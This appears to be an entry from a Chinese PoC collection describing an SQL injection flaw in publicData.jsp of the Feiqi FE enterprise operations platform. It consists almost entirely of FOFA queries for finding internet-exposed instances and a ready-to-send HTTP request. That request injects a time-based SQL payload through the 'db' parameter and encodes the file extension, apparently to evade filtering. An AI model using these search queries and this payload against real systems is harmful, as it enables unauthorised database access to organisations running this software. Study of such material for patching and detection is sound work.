## 飞企互联-FE企业运营管理平台publicData.jsp存在SQL注入漏洞

## fofa
```
app="FE-协作平台"
app="飞企互联-FE企业运营管理平台"
```

## poc
```
GET /oaerp/ui/common/publicData.js%70?type=getAllTableInfo&db=';waitfor+delay+'0:0:3'-- HTTP/1.1
Host: ip
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,imag e/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```
